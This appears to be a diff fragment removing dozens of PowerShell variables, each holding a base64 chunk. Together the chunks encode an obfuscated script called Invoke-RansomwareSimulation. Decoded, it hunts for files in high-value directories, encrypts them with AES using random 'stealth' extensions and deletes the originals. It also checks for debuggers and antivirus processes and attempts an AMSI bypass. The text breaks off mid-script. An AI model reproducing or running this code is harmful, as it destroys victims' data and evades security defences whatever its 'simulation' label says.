-$jDAIhSja = 'ZXEgMCkgewogICAgICAg';
-$blFNTRwH = 'IFdyaXRlLUhvc3QgIiAg';
-$kwwlCgwa = '8J+TnSBObyBmaWxlcyBm';
-$UqOLarGp = 'b3VuZCwgY3JlYXRpbmcg';
-$VEiLUxVT = 'dGVzdCBmaWxlcyBpbiBw';
-$ggBocHnP = 'cmlvcml0eSBkaXJlY3Rv';
-$JdOgwWju = 'cmllcy4uLiIgLUZvcmVn';
-$sdwNNpjb = 'cm91bmRDb2xvciBZZWxs';
-$cPXMuFaL = 'b3cKICAgICAgICBmb3Jl';
-$RNkVYqPt = 'YWNoICgkcGF0aCBpbiAk';
-$kEludlZM = 'UGF0aHMpIHsKICAgICAg';
-$KNFXszxu = 'ICAgICAgaWYgKFRlc3Qt';
-$ViQwDJid = 'UGF0aCAkcGF0aCkgewog';
-$etwtcTBK = 'ICAgICAgICAgICAgICAg';
-$kGuUZyeS = 'dHJ5IHsKICAgICAgICAg';
-$WEluBoqR = 'ICAgICAgICAgICAjIENy';
-$SjiZJHFR = 'ZWF0ZSBhIHRlc3Qgc3Vi';
-$nsSqdQvi = 'Zm9sZGVyCiAgICAgICAg';
-$sbnrGeuw = 'ICAgICAgICAgICAgJHRl';
-$RjFNydJb = 'c3RTdWJEaXIgPSBKb2lu';
-$UlZcXRDr = 'LVBhdGggJHBhdGggIlRl';
-$ZPcsqRQT = 'c3RGaWxlcyIKICAgICAg';
-$bvVCgReJ = 'ICAgICAgICAgICAgICBO';
-$RhgpgTqT = 'ZXctSXRlbSAtSXRlbVR5';
-$LnKptIHl = 'cGUgRGlyZWN0b3J5IC1Q';
-$YwtWxqKu = 'YXRoICR0ZXN0U3ViRGly';
-$XUBLQYXL = 'IC1Gb3JjZSAtRXJyb3JB';
-$uaHhMkYE = 'Y3Rpb24gU2lsZW50bHlD';
-$tkQVPGyX = 'b250aW51ZSB8IE91dC1O';
-$tDCWYXaP = 'dWxsCgogICAgICAgICAg';
-$LxleZAOk = 'ICAgICAgICAgICMgQ3Jl';
-$PAzzySaX = 'YXRlIHZhcmlvdXMgdGVz';
-$fLUXYQdt = 'dCBmaWxlcyBvZiBkaWZm';
-$mbOzXvIj = 'ZXJlbnQgc2l6ZXMKICAg';
-$NOIXPLzA = 'ICAgICAgICAgICAgICAg';
-$rYIhDoyY = 'ICAiVGVzdCBkb2N1bWVu';
-$jnyFBHQu = 'dCBjb250ZW50IiB8IE91';
-$FmrIzyvu = 'dC1GaWxlIChKb2luLVBh';
-$hvWlCrWl = 'dGggJHRlc3RTdWJEaXIg';
-$zzmXMtCK = 'InRlc3RfZG9jdW1lbnQu';
-$pIACnkGD = 'dHh0IikgLUVycm9yQWN0';
-$RYuNqiGt = 'aW9uIFNpbGVudGx5Q29u';
-$OxMMdvBW = 'dGludWUKICAgICAgICAg';
-$OJoGaaQB = 'ICAgICAgICAgICAiVGVz';
-$tnGHAOxd = 'dCBkYXRhLENvbHVtbjEs';
-$CEAjHvOb = 'Q29sdW1uMmBuRGF0YTEs';
-$ExRgEAEi = 'VmFsdWUxLFZhbHVlMiIg';
-$flWHHwiD = 'fCBPdXQtRmlsZSAoSm9p';
-$fGByTZbF = 'bi1QYXRoICR0ZXN0U3Vi';
-$ZppdbHIx = 'RGlyICJ0ZXN0X2RhdGEu';
-$gdDWqnpU = 'Y3N2IikgLUVycm9yQWN0';
-$thvBTGRK = 'aW9uIFNpbGVudGx5Q29u';
-$KeRZvVkT = 'dGludWUKICAgICAgICAg';
-$JJLGgspv = 'ICAgICAgICAgICAiVGVz';
-$WazajMds = 'dCBzY3JpcHQgY29udGVu';
-$pHUHhvDe = 'dCIgfCBPdXQtRmlsZSAo';
-$IDfPIzPD = 'Sm9pbi1QYXRoICR0ZXN0';
-$VDGOLJpF = 'U3ViRGlyICJ0ZXN0X3Nj';
-$gMUkkjOr = 'cmlwdC5weSIpIC1FcnJv';
-$KZzJTVtC = 'ckFjdGlvbiBTaWxlbnRs';
-$hPVXLLpH = 'eUNvbnRpbnVlCgogICAg';
-$sBFuzKpX = 'ICAgICAgICAgICAgICAg';
-$JIgiYDma = 'ICMgQ3JlYXRlIGxhcmdl';
-$mOMgnzhp = 'ciB0ZXN0IGZpbGVzCiAg';
-$AgZuPMrq = 'ICAgICAgICAgICAgICAg';
-$pFPUeyql = 'ICAgKCJMYXJnZSB0ZXN0';
-$fvJctxyz = 'IGNvbnRlbnQgIiAqIDEw';
-$rVitBBen = 'MDApIHwgT3V0LUZpbGUg';
-$XwuUEKKU = 'KEpvaW4tUGF0aCAkdGVz';
-$bBPUKmqj = 'dFN1YkRpciAibGFyZ2Vf';
-$lBIotMnj = 'dGVzdC50eHQiKSAtRXJy';
-$gKzpFBno = 'b3JBY3Rpb24gU2lsZW50';
-$vXaHocGr = 'bHlDb250aW51ZQoKICAg';
-$wozJnRJM = 'ICAgICAgICAgICAgICAg';
-$JZiLWUit = 'ICAjIENyZWF0ZSBuZXN0';
-$WUQDRefb = 'ZWQgc3ViZm9sZGVyIHdp';
-$RgoMSLAf = 'dGggZmlsZXMKICAgICAg';
-$UMjXcGzE = 'ICAgICAgICAgICAgICAk';
-$kzHEZXsP = 'bmVzdGVkRGlyID0gSm9p';
-$WESiffMa = 'bi1QYXRoICR0ZXN0U3Vi';
-$IrZhMnNq = 'RGlyICJOZXN0ZWQiCiAg';
-$OuJqRWdv = 'ICAgICAgICAgICAgICAg';
-$wuPmfHFI = 'ICAgTmV3LUl0ZW0gLUl0';
-$gfoZpdxA = 'ZW1UeXBlIERpcmVjdG9y';
-$jDSTIMgQ = 'eSAtUGF0aCAkbmVzdGVk';
-$TRadgtKV = 'RGlyIC1Gb3JjZSAtRXJy';
-$aIoqKULG = 'b3JBY3Rpb24gU2lsZW50';
-$JCinkltr = 'bHlDb250aW51ZSB8IE91';
-$lBnyPgpK = 'dC1OdWxsCiAgICAgICAg';
-$hrAzQVaU = 'ICAgICAgICAgICAgIk5l';
-$GmbEEtnE = 'c3RlZCBmaWxlIGNvbnRl';
-$GGTgkzFf = 'bnQiIHwgT3V0LUZpbGUg';
-$aXwKWMKB = 'KEpvaW4tUGF0aCAkbmVz';
-$EgtiwrCL = 'dGVkRGlyICJuZXN0ZWRf';
-$dFlOwtMU = 'ZmlsZS50eHQiKSAtRXJy';
-$aNxzJkMH = 'b3JBY3Rpb24gU2lsZW50';
-$zabnqzha = 'bHlDb250aW51ZQogICAg';
-$TTYzcBxE = 'ICAgICAgICAgICAgICAg';
-$pjMSTqtb = 'ICgiTmVzdGVkIGxhcmdl';
-$MDCLCHHz = 'IGNvbnRlbnQgIiAqIDUw';
-$ihPbIyUb = 'MCkgfCBPdXQtRmlsZSAo';
-$JLsVZAWm = 'Sm9pbi1QYXRoICRuZXN0';
-$dMCPzzLP = 'ZWREaXIgIm5lc3RlZF9s';
-$GENldFKf = 'YXJnZS50eHQiKSAtRXJy';
-$DbTveRDe = 'b3JBY3Rpb24gU2lsZW50';
-$NtVtZWxZ = 'bHlDb250aW51ZQoKICAg';
-$YzuTesKr = 'ICAgICAgICAgICAgICAg';
-$OIZWQGoY = 'ICBXcml0ZS1Ib3N0ICIg';
-$YylBVgOA = 'ICAg4pyFIENyZWF0ZWQg';
-$cqxtGRiz = 'dGVzdCBmaWxlcyBpbiAk';
-$CRfEMxFA = 'KChbU3lzdGVtLklPLlBh';
-$YNwZASqD = 'dGhdOjpHZXRGaWxlTmFt';
-$LRZNMwER = 'ZSgkcGF0aCkpKSIgLUZv';
-$oLbLVuMy = 'cmVncm91bmRDb2xvciBH';
-$esLoTjzH = 'cmVlbgogICAgICAgICAg';
-$Zzowveue = 'ICAgICAgfSBjYXRjaCB7';
-$siSzQYMV = 'CiAgICAgICAgICAgICAg';
-$rqskxUyr = 'ICAgICAgV3JpdGUtSG9z';
-$hEIELNVN = 'dCAiICAgIOKaoO+4jyAg';
-$krbSEpGP = 'Q291bGQgbm90IGNyZWF0';
-$pjfaIVMz = 'ZSB0ZXN0IGZpbGVzIGlu';
-$kNsEGORO = 'ICQoKFtTeXN0ZW0uSU8u';
-$zTvBMdRd = 'UGF0aF06OkdldEZpbGVO';
-$qHfLyhGC = 'YW1lKCRwYXRoKSkpIiAt';
-$ZnKbyUqo = 'Rm9yZWdyb3VuZENvbG9y';
-$pqXzgKhx = 'IFllbGxvdwogICAgICAg';
-$fmxTVdoD = 'ICAgICAgICAgfQogICAg';
-$nHysBURt = 'ICAgICAgICB9CiAgICAg';
-$GnCwvTtG = 'ICAgfQoKICAgICAgICAj';
-$SzIThIQQ = 'IFJlLXNjYW4gYWZ0ZXIg';
-$YxawuJdv = 'Y3JlYXRpbmcgdGVzdCBm';
-$kFxrhngv = 'aWxlcwogICAgICAgIFdy';
-$BVtJqflt = 'aXRlLUhvc3QgIiAg8J+U';
-$oOlfkYjx = 'hCBSZS1zY2FubmluZyBh';
-$GtdMcNcT = 'ZnRlciBjcmVhdGluZyB0';
-$CKWTvgXF = 'ZXN0IGZpbGVzLi4uIiAt';
-$ZpVbjnrG = 'Rm9yZWdyb3VuZENvbG9y';
-$qImoyvBg = 'IEN5YW4KICAgICAgICBm';
-$qOPfHevu = 'b3JlYWNoICgkcGF0aCBp';
-$TjUAxDIL = 'biAkUGF0aHMpIHsKICAg';
-$APxTbeIf = 'ICAgICAgICAgaWYgKFRl';
-$PkaVZmiS = 'c3QtUGF0aCAkcGF0aCkg';
-$QmrNEUvs = 'ewogICAgICAgICAgICAg';
-$OuWDwYIz = 'ICAgdHJ5IHsKICAgICAg';
-$eLjreaWH = 'ICAgICAgICAgICAgICAk';
-$ZNTBJrCs = 'YWxsRmlsZXMgPSBHZXQt';
-$NCdkESpC = 'Q2hpbGRJdGVtIC1QYXRo';
-$CRwtabcr = 'ICRwYXRoIC1SZWN1cnNl';
-$wdLqZFXM = 'IC1GaWxlIC1FcnJvckFj';
-$udQtYoyz = 'dGlvbiBTaWxlbnRseUNv';
-$ELnkmBea = 'bnRpbnVlCiAgICAgICAg';
-$cSkkKaDU = 'ICAgICAgICAgICAgZm9y';
-$UHFhLrnh = 'ZWFjaCAoJGZpbGUgaW4g';
-$aeBieXaz = 'JGFsbEZpbGVzKSB7CiAg';
-$LomjhlPA = 'ICAgICAgICAgICAgICAg';
-$ZaIQJvFe = 'ICAgICAgIGlmICgkZmls';
-$MYJokKgR = 'ZS5MZW5ndGggLWd0IDAp';
-$GppwWiyP = 'IHsKICAgICAgICAgICAg';
-$UKhQfuYW = 'ICAgICAgICAgICAgICAg';
-$nuaINZRA = 'ICRmaWxlcy5BZGQoJGZp';
-$XUYFfQRV = 'bGUpCiAgICAgICAgICAg';
-$rJQchfwk = 'ICAgICAgICAgICAgIH0K';
-$DDueVYcD = 'ICAgICAgICAgICAgICAg';
-$NdAdbVHs = 'ICAgICB9CiAgICAgICAg';
-$sRTiiPqZ = 'ICAgICAgICB9IGNhdGNo';
-$oKGwLUJy = 'IHsgfQogICAgICAgICAg';
-$yaJMQWsv = 'ICB9CiAgICAgICAgfQog';
-$zrEpobId = 'ICAgfQoKICAgIFdyaXRl';
-$aLgVGYsI = 'LUhvc3QgIiAg8J+TiiBU';
-$llbVnAuX = 'b3RhbCBmaWxlcyBmb3Vu';
-$MmVCTrVL = 'ZCBmb3IgZW5jcnlwdGlv';
-$jeBLtvmU = 'bjogJCgkZmlsZXMuQ291';
-$zNuCeRKC = 'bnQpIiAtRm9yZWdyb3Vu';
-$pMuNYEjl = 'ZENvbG9yIEdyZWVuCiAg';
-$TtoYotkr = 'ICByZXR1cm4gJGZpbGVz';
-$TwqBVwTs = 'LlRvQXJyYXkoKQp9Cgoj';
-$rSmGpsVn = 'IE11bHRpLXRocmVhZGVk';
-$ooNFwegM = 'IGVuY3J5cHRpb24gZW5n';
-$kEhKpAoJ = 'aW5lIHdpdGggc3RlYWx0';
-$hndEyPCq = 'aCBmZWF0dXJlcwpmdW5j';
-$oSPLGnth = 'dGlvbiBTdGFydC1NdWx0';
-$tdSoNECl = 'aVRocmVhZGVkRW5jcnlw';
-$uslHjvhF = 'dGlvbiB7CiAgICBwYXJh';
-$snRmimLh = 'bSgkRmlsZXMsICRLZXks';
-$oickSABV = 'ICRNYXhUaHJlYWRzLCAk';
-$yofrbVpj = 'U3RlYWx0aEV4dGVuc2lv';
-$jDzzzTML = 'bnMpCiAgICAkam9icyA9';
-$UHhBVIdo = 'IEAoKQogICAgJHBvb2wg';
-$wyJJHvaW = 'PSBbUnVuc3BhY2VGYWN0';
-$XgXYkZSV = 'b3J5XTo6Q3JlYXRlUnVu';
-$QYVdqeOG = 'c3BhY2VQb29sKDEsICRN';
-$fexhrFcc = 'YXhUaHJlYWRzKQogICAg';
-$XJeuDBiY = 'JHBvb2wuT3BlbigpCiAg';
-$ImOqetXT = 'ICAkcmVzdWx0cyA9IEAo';
-$XtQqigyO = 'KQoKICAgIGZvcmVhY2gg';
-$GqQPJnRB = 'KCRmaWxlIGluICRGaWxl';
-$hdrCNWrP = 'cykgewogICAgICAgICRw';
-$yXshHPKF = 'cyA9IFtQb3dlclNoZWxs';
-$BgoNKSdN = 'XTo6Q3JlYXRlKCkuQWRk';
-$zcufkxTK = 'U2NyaXB0KHsKICAgICAg';
-$sGMcibUS = 'ICAgICAgcGFyYW0oJHBh';
-$jOxkbMaA = 'dGgsICRrZXksICRzdGVh';
-$nHxwlLsy = 'bHRoRXh0cykKICAgICAg';
-$kSKRgEjc = 'ICAgICAgZnVuY3Rpb24g';
-$UpSWPtQf = 'RW5jcnlwdC1GaWxlIHsK';
-$QdtFmvoF = 'ICAgICAgICAgICAgICAg';
-$NCdsPkDr = 'IHBhcmFtKCRGaWxlUGF0';
-$vOYwKqrm = 'aCwgJEtleSwgJFN0ZWFs';
-$lnmTeCuE = 'dGhFeHRlbnNpb25zKQog';
-$ytYVdCDU = 'ICAgICAgICAgICAgICAg';
-$wTiBykeE = 'dHJ5IHsKICAgICAgICAg';
-$dosAPGXT = 'ICAgICAgICAgICAkYWVz';
-$jrWtPbPC = 'ID0gTmV3LU9iamVjdCBT';
-$nZEWNwFj = 'eXN0ZW0uU2VjdXJpdHku';
-$EHFFeyPC = 'Q3J5cHRvZ3JhcGh5LkFl';
-$UYgCWPvn = 'c0NyeXB0b1NlcnZpY2VQ';
-$KyVLohiR = 'cm92aWRlcgogICAgICAg';
-$KWSyBbRw = 'ICAgICAgICAgICAgICRh';
-$cNQaXKty = 'ZXMuS2V5ID0gW1N5c3Rl';
-$ObYJaBGg = 'bS5Db252ZXJ0XTo6RnJv';
-$DgIRkiSI = 'bUJhc2U2NFN0cmluZygk';
-$rjSOHAlp = 'S2V5KQogICAgICAgICAg';
-$IFPRodqJ = 'ICAgICAgICAgICRhZXMu';
-$AnbVuMAv = 'R2VuZXJhdGVJVigpCiAg';
-$UWCkjSyS = 'ICAgICAgICAgICAgICAg';
-$zJqJCAph = 'ICAgJGFlcy5Nb2RlID0g';
-$vLWIbCJY = 'W1N5c3RlbS5TZWN1cml0';
-$nkuyFEnX = 'eS5DcnlwdG9ncmFwaHku';
-$JKBTsvfy = 'Q2lwaGVyTW9kZV06OkNC';
-$ALuDlRMr = 'QwogICAgICAgICAgICAg';
-$HdlSCzak = 'ICAgICAgICRhZXMuUGFk';
-$mvAHOUTh = 'ZGluZyA9IFtTeXN0ZW0u';
-$FEzBTioy = 'U2VjdXJpdHkuQ3J5cHRv';
-$vZJzqLcm = 'Z3JhcGh5LlBhZGRpbmdN';
-$yttTscet = 'b2RlXTo6UEtDUzcKCiAg';
-$uWmJMSCy = 'ICAgICAgICAgICAgICAg';
-$byKuQrBn = 'ICAgJGlucHV0Qnl0ZXMg';
-$snaNytUA = 'PSBbU3lzdGVtLklPLkZp';
-$JvcJYcPV = 'bGVdOjpSZWFkQWxsQnl0';
-$kqURMuju = 'ZXMoJEZpbGVQYXRoKQog';
-$sYlvKMix = 'ICAgICAgICAgICAgICAg';
-$wlwAeKDA = 'ICAgICRlbmNyeXB0b3Ig';
-$mgsgXQyI = 'PSAkYWVzLkNyZWF0ZUVu';
-$iqXhPtLh = 'Y3J5cHRvcigpCgogICAg';
-$GHilOpjC = 'ICAgICAgICAgICAgICAg';
-$VAPimgWR = 'ICRlbmNyeXB0ZWRCeXRl';
-$DoLnqrzi = 'cyA9ICRlbmNyeXB0b3Iu';
-$HTrPICyL = 'VHJhbnNmb3JtRmluYWxC';
-$BMpfPxUP = 'bG9jaygkaW5wdXRCeXRl';
-$NUpsGOhu = 'cywgMCwgJGlucHV0Qnl0';
-$mXUCXMXN = 'ZXMuTGVuZ3RoKQogICAg';
-$pikbxaVh = 'ICAgICAgICAgICAgICAg';
-$lSblNnzB = 'ICRyZXN1bHQgPSBOZXct';
-$rxxlJEDS = 'T2JqZWN0IGJ5dGVbXSAo';
-$oKMidFbH = 'JGFlcy5JVi5MZW5ndGgg';
-$sxFIAodR = 'KyAkZW5jcnlwdGVkQnl0';
-$wNYcPSHg = 'ZXMuTGVuZ3RoKQogICAg';
-$PmvANQVx = 'ICAgICAgICAgICAgICAg';
-$gXAKiXnC = 'IFtTeXN0ZW0uQXJyYXld';
-$thMvofce = 'OjpDb3B5KCRhZXMuSVYs';
-$ujqeYkHS = 'IDAsICRyZXN1bHQsIDAs';
-$wnwmiaSx = 'ICRhZXMuSVYuTGVuZ3Ro';
-$xCrfKioi = 'KQogICAgICAgICAgICAg';
-$RqQkzIBM = 'ICAgICAgIFtTeXN0ZW0u';
-$DgfnUEal = 'QXJyYXldOjpDb3B5KCRl';
-$SuuvlbeM = 'bmNyeXB0ZWRCeXRlcywg';
-$vAEJIHNV = 'MCwgJHJlc3VsdCwgJGFl';
-$IrcfeZsj = 'cy5JVi5MZW5ndGgsICRl';
-$QWYXfHkl = 'bmNyeXB0ZWRCeXRlcy5M';
-$bSMbrLzA = 'ZW5ndGgpCgogICAgICAg';
-$PZYnQnLb = 'ICAgICAgICAgICAgICMg';
-$VJSYyikr = 'U3RlYWx0aDogVXNlIHJh';
-$SLMiYfRq = 'bmRvbSBleHRlbnNpb24g';
-$ZMbzYwxz = 'dG8gYnlwYXNzIGRldGVj';
-$KTWVPoWE = 'dGlvbgogICAgICAgICAg';
-$SNwNYSHk = 'ICAgICAgICAgICRyYW5k';
-$QJTwTOuW = 'b21FeHRlbnNpb24gPSAk';
-$UqQPrruJ = 'U3RlYWx0aEV4dGVuc2lv';
-$EehtkcDa = 'bnMgfCBHZXQtUmFuZG9t';
-$cLsAcYDw = 'CiAgICAgICAgICAgICAg';
-$tfmYPczx = 'ICAgICAgJG91dHB1dFBh';
-$FbszATcX = 'dGggPSAkRmlsZVBhdGgg';
-$KmGXyadL = 'KyAkcmFuZG9tRXh0ZW5z';
-$ahWNGOJu = 'aW9uCgogICAgICAgICAg';
-$cMcMXDCV = 'ICAgICAgICAgIFtTeXN0';
-$lhqzuOqH = 'ZW0uSU8uRmlsZV06Oldy';
-$NVHrNxuh = 'aXRlQWxsQnl0ZXMoJG91';
-$xRCkjDar = 'dHB1dFBhdGgsICRyZXN1';
-$pJfjZGJp = 'bHQpCiAgICAgICAgICAg';
-$rRudHKLs = 'ICAgICAgICAgW1N5c3Rl';
-$EwERHZcp = 'bS5JTy5GaWxlXTo6RGVs';
-$eVniKSrT = 'ZXRlKCRGaWxlUGF0aCkK';
-$dAuiQGLC = 'CiAgICAgICAgICAgICAg';
-$hwbuOnIg = 'ICAgICAgJGFlcy5EaXNw';
-$UUrViHdD = 'b3NlKCkKICAgICAgICAg';
-$urDyVOVH = 'ICAgICAgICAgICByZXR1';
-$AWJZLGpB = 'cm4gQHsgU3VjY2VzcyA9';
-$xCAKrZsA = 'ICR0cnVlOyBPcmlnaW5h';
-$rzGFmmNw = 'bFBhdGggPSAkRmlsZVBh';
-$juWMvJBE = 'dGg7IEVuY3J5cHRlZFBh';
-$pPDuAsnr = 'dGggPSAkb3V0cHV0UGF0';
-$yZgmvBam = 'aCB9CiAgICAgICAgICAg';
-$lucmPqwX = 'ICAgICB9IGNhdGNoIHsK';
-$OgRrPXny = 'ICAgICAgICAgICAgICAg';
-$RGJCdNAe = 'ICAgICByZXR1cm4gQHsg';
-$sMZFMsSs = 'U3VjY2VzcyA9ICRmYWxz';
-$RWTJCurV = 'ZTsgT3JpZ2luYWxQYXRo';
-$lnCgzATI = 'ID0gJEZpbGVQYXRoOyBF';
-$QphzQPOm = 'bmNyeXB0ZWRQYXRoID0g';
-$gUYVyxCG = 'JG51bGwgfQogICAgICAg';
-$eLYVcPqG = 'ICAgICAgICAgfQogICAg';
-$fekOBaBb = 'ICAgICAgICB9CiAgICAg';
-$jVncUiXD = 'ICAgICAgIEVuY3J5cHQt';
-$ZbxIGCdr = 'RmlsZSAkcGF0aCAka2V5';
-$XGKFwiZd = 'ICRzdGVhbHRoRXh0cwog';
-$BPqdhyPB = 'ICAgICAgIH0pLkFkZFBh';
-$YfDXqmaI = 'cmFtZXRlcigicGF0aCIs';
-$lTtafprr = 'ICRmaWxlLkZ1bGxOYW1l';
-$HJmcAMKS = 'KS5BZGRQYXJhbWV0ZXIo';
-$cjWPRpqv = 'ImtleSIsICRLZXkpLkFk';
-$ZUqFebua = 'ZFBhcmFtZXRlcigic3Rl';
-$mcdnpuri = 'YWx0aEV4dHMiLCAkU3Rl';
-$EBCmOvce = 'YWx0aEV4dGVuc2lvbnMp';
-$qMRGouuM = 'CgogICAgICAgICRwcy5S';
-$gTlbbeji = 'dW5zcGFjZVBvb2wgPSAk';
-$kZITuUet = 'cG9vbAogICAgICAgICRq';
-$LayIIJbX = 'b2JzICs9IEB7IFBvd2Vy';
-$AkITLjLY = 'U2hlbGwgPSAkcHM7IEhh';
-$XaXiNzIx = 'bmRsZSA9ICRwcy5CZWdp';
-$JqEscWYt = 'bkludm9rZSgpIH0KICAg';
-$sgHXFydR = 'IH0KCiAgICAjIFdhaXQg';
-$FusWZFyk = 'YW5kIGNvbGxlY3QgcmVz';
-$zmUgjTLW = 'dWx0cwogICAgZm9yZWFj';
-$AQRiZNPN = 'aCAoJGpvYiBpbiAkam9i';
-$KDIWcPkM = 'cykgewogICAgICAgICRy';
-$SpvySymz = 'ZXN1bHQgPSAkam9iLlBv';
-$HZqjbVlU = 'd2VyU2hlbGwuRW5kSW52';
-$VESsQiDv = 'b2tlKCRqb2IuSGFuZGxl';
-$YfGgvkiq = 'KQogICAgICAgICRyZXN1';
-$lXkQtTlF = 'bHRzICs9ICRyZXN1bHQK';
-$FnBTEzaL = 'ICAgICAgICAkam9iLlBv';
-$JJejAeLQ = 'd2VyU2hlbGwuRGlzcG9z';
-$disffkBe = 'ZSgpCiAgICB9CiAgICAk';
-$zMIogCmh = 'cG9vbC5DbG9zZSgpCgog';
-$dSoHVfmA = 'ICAgcmV0dXJuICRyZXN1';
-$bwMakUzM = 'bHRzCn0KCiMgTWFpbiBl';
-$sLLzRmrF = 'eGVjdXRpb24KZnVuY3Rp';
-$GASAhOWR = 'b24gSW52b2tlLVJhbnNv';
-$XULboyRf = 'bXdhcmVTaW11bGF0aW9u';
-$VrQJBuXY = 'IHsKICAgIFdyaXRlLUhv';
-$xRjupEDW = 'c3QgIvCflI0gUGVyZm9y';
-$XoiEDNsY = 'bWluZyBzZWN1cml0eSBj';
-$VqdlNQTn = 'aGVja3MuLi4iIC1Gb3Jl';
-$wlMIcoYF = 'Z3JvdW5kQ29sb3IgWWVs';
-$CguICRxo = 'bG93CgogICAgIyBFdmFz';
-$QmRmyYHk = 'aW9uIGNoZWNrcwogICAg';
-$VQFNCCbc = 'aWYgKFtTeXN0ZW0uRGlh';
-$sjxomraO = 'Z25vc3RpY3MuRGVidWdn';
-$qjoYyNQQ = 'ZXJdOjpJc0F0dGFjaGVk';
-$ZrqvBnuH = 'KSB7CiAgICAgICAgV3Jp';
-$QvaviJuU = 'dGUtSG9zdCAi4p2MIERl';
-$ZeMIlSuG = 'YnVnZ2VyIGRldGVjdGVk';
-$myMniPLb = 'ISBFeGl0aW5nIGZvciBz';
-$CAbKVNDT = 'YWZldHkuIiAtRm9yZWdy';
-$dcnRCjaR = 'b3VuZENvbG9yIFJlZAog';
-$GgQnjKka = 'ICAgICAgIGV4aXQKICAg';
-$ETCtuJzH = 'IH0KCiAgICAkYXZQcm9j';
-$odMckPIF = 'ZXNzZXMgPSBAKCJNc01w';
-$rqnbTBvR = 'RW5nIiwgImVrcm4iLCAi';
-$kPRONHCp = 'YXZwIiwgImRlZmVuZGVy';
-$TUlAfuEL = 'IikKICAgICRhdlJ1bm5p';
-$SJCyoxFS = 'bmcgPSBHZXQtUHJvY2Vz';
-$vmvpQpxX = 'cyB8IFdoZXJlLU9iamVj';
-$GJzRfTlB = 'dCB7ICRhdlByb2Nlc3Nl';
-$jHewAoUL = 'cyAtY29udGFpbnMgJF8u';
-$bXyUqoyK = 'UHJvY2Vzc05hbWUgfQog';
-$CspPSsXY = 'ICAgaWYgKCRhdlJ1bm5p';
-$SmFFAkPN = 'bmcpIHsKICAgICAgICBX';
-$zOoVEVxI = 'cml0ZS1Ib3N0ICLimqDv';
-$nerpJhpH = 'uI8gIEFWIGRldGVjdGVk';
-$FLfAiWzC = 'OiAkKCRhdlJ1bm5pbmcu';
-$AeqUtpan = 'UHJvY2Vzc05hbWUgLWpv';
-$UxqASLOJ = 'aW4gJywgJykiIC1Gb3Jl';
-$KtsQZqXr = 'Z3JvdW5kQ29sb3IgWWVs';
-$ZYLFkIEv = 'bG93CiAgICB9CgogICAg';
-$zjaxHeDe = 'IyBBTVNJIGJ5cGFzcyAo';
-$EWFlGvWv = 'ZWR1Y2F0aW9uYWwpCiAg';
-$YJCNXMbD = 'ICBXcml0ZS1Ib3N0ICLw';
-$jFoftstP = 'n5SnIEF0dGVtcHRpbmcg';
-$DLbOOWiH = 'QU1TSSBieXBhc3MuLi4i';
-$defgrFli = 'IC1Gb3JlZ3JvdW5kQ29s';
-$mhqLdWjj = 'b3IgQ3lhbgogICAgdHJ5';
-$ZEUtHjhi = 'IHsKICAgICAgICBbUmVm';
-$QPhixUSU = 'XS5Bc3NlbWJseS5HZXRU';
-$JPQLkptC = 'eXBlKCdTeXN0ZW0uTWFu';
-$sMfAxcLg = 'YWdlbWVudC5BdXRvbWF0';
-$VzxlAFtS = 'aW9uLkFtc2lVdGlscycp';
-$nncmzCst = 'LkdldEZpZWxkKCdhbXNp';
-$iOsfiKLW = 'SW5pdEZhaWxlZCcsJ05v';
-$fTQDFnlp = 'blB1YmxpYyxTdGF0aWMn';
-$IHUuvFJA = 'KS5TZXRWYWx1ZSgkbnVs';
-$qpWfHmmn = 'bCwkdHJ1ZSkKICAgICAg';
-$NiYDsKvj = 'ICBXcml0ZS1Ib3N0ICLi';
-$dJLiafvg = 'nIUgQU1TSSBieXBhc3Nl';
-$jbijSyfO = 'ZCIgLUZvcmVncm91bmRD';
-$DIKiKEWT = 'b2xvciBHcmVlbgogICAg';
-$MGuAgsPY = 'fSBjYXRjaCB7CiAgICAg';
-$osMNNBuH = 'ICAgV3JpdGUtSG9zdCAi';
-$adbEQBrM = '4pqg77iPICBBTVNJIGJ5';
-$dGkyywNi = 'cGFzcyBmYWlsZWQgKGV4';
-$islULwxe = 'cGVjdGVkIGluIHNvbWUg';
-$sbQIZxPk = 'ZW52aXJvbm1lbnRzKSIg';
-$WkfVjUzv = 'LUZvcmVncm91bmRDb2xv';
-$yTveGEkr = 'ciBZZWxsb3cKICAgIH0K';
-$tdupdDJm = 'CiAgICBXcml0ZS1Ib3N0';
-$WhPqXgCW = 'ICJgbvCfk4IgU2Nhbm5p';
-$fiQQetdh = 'bmcgZm9yIHRhcmdldCBm';
-$dXwIPuHn = 'aWxlcy4uLiIgLUZvcmVn';
-$QUgwGAtm = 'cm91bmRDb2xvciBDeWFu';
-$ZWoDAdib = 'CiAgICBXcml0ZS1Ib3N0';
-$rZoiFkHm = 'ICIgIPCfjq8gVGFyZ2V0';
-$PExanluU = 'aW5nIGhpZ2gtdmFsdWUg';
-$KEpBftPf = 'ZGlyZWN0b3JpZXMgZmly';
-$MmFNoSSf = 'c3QuLi4iIC1Gb3JlZ3Jv';
-$rrbYYxVI = 'dW5kQ29sb3IgWWVsbG93';
-$rhCUhtOG = 'CiAgICBXcml0ZS1Ib3N0';
-$dBuUZCUv = 'ICIgIPCfk40gUHJpb3Jp';
-$XGgRbznG = 'dHkgZGlyZWN0b3JpZXM6';
-$ajNHbrQb = 'IiAtRm9yZWdyb3VuZENv';
-$OzeMVQOB = 'bG9yIEN5YW4KICAgIGZv';
-$kiMHQYwW = 'cmVhY2ggKCRkaXIgaW4g';
-$UDOeReVY = 'JENvbmZpZy5Qcmlvcml0';
-$bKMGtYmf = 'eURpcnMpIHsKICAgICAg';
-$DmXvGZmf = 'ICBXcml0ZS1Ib3N0ICIg';
-$uAvtBXpM = 'ICAg4oCiICRkaXIiIC1G';
-$EnFVlceE = 'b3JlZ3JvdW5kQ29sb3Ig';
-$VUqTpfsB = 'V2hpdGUKICAgIH0KCiAg';
-$BxrlXXJm = 'ICAjIFVzZSBmYXN0ZXIg';
-$leEHwkKN = 'c2Nhbm5pbmcgbWV0aG9k';
-$VDCqVkjp = 'IHdpdGggcHJvZ3Jlc3MK';
-$gwdjAtiP = 'ICAgICRzdGFydFNjYW4g';
-$myfAjLhS = 'PSBHZXQtRGF0ZQogICAg';
-$EjyNfsEM = 'JHRhcmdldEZpbGVzID0g';
-$DwhQNyzj = 'RmluZC1UYXJnZXRGaWxl';
-$NBvMjWsb = 'c1ByaW9yaXR5IC1QYXRo';
-$aGkgicdS = 'cyAkQ29uZmlnLlByaW9y';
-$ccwtAhAE = 'aXR5RGlycwogICAgJHNj';
-$jSzWoahS = 'YW5UaW1lID0gKEdldC1E';
